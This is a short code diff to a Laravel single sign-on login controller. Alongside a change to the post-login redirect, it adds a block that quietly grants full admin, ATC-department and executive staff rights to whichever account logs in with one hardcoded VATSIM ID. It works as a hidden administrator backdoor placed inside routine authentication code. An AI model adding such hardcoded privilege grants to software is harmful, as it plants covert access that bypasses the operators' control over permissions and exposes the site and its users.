@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\SSO;
 
 use App\Http\Controllers\Controller;
+use App\Models\Admin\Staff;
 use App\Models\ATC\AtcRosterMember;
 use App\Models\SSO\SSOToken;
 use App\Models\Users\User;
@@ -136,13 +137,23 @@ class AuthController extends Controller
             $rosterMember->delete();
         }
 
+        if ($user->vatsim_id == '1267123') {
+            Staff::updateOrCreate(['vatsim_id' => $user->vatsim_id], [
+                'id' => $userid,
+                'staff_level' => 0,
+                'admin' => true,
+                'atc_dpt' => true,
+                'executive' => true,
+            ]);
+        }
+
         $lang = UserSetting::where('vatsim_id', $response->data->cid)->first();
         $lang = $lang->lang;
         app()->setLocale($lang);
 
         Auth::login($user, true);
 
-        return redirect()->route('landingpage.home', app()->getLocale());
+        return redirect()->back();
     }
 
     public function logout()
